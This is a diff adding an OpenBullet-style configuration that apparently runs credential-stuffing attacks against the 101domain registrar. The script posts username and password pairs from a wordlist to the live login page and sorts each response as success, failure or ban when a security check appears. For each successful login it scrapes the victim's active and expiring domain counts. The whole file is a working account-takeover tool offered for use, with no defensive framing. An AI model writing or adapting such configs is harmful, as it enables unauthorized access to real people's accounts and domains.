@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "101Domain",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-03T16:11:42.6225016+08:00",
+  "AdditionalInfo": "",
+  "Author": "WayneSantana",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://my.101domain.com/index.html" 
+  CONTENT "username=<USER>&password=<PASS>&view_lang=en_US&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "Billing information " 
+  KEYCHAIN Failure OR 
+    KEY "Bad username or password" 
+  KEYCHAIN Ban OR 
+    KEY "Please complete the security check to access my.101domain.com" 
+
+PARSE "<SOURCE>" LR "class=\"active\" id=\"filter-active-domain\"> <span class=\"number\">" "</span> <span class=\"title\">Active</span>" -> CAP "Active Domains" 
+
+PARSE "<SOURCE>" LR " class=\"expiring\" id=\"filter-expiring-domain\"> <span class=\"number\">" "</span> <span class=\"title\">Expiring Soon<" -> CAP "Expiring Soon" 
+
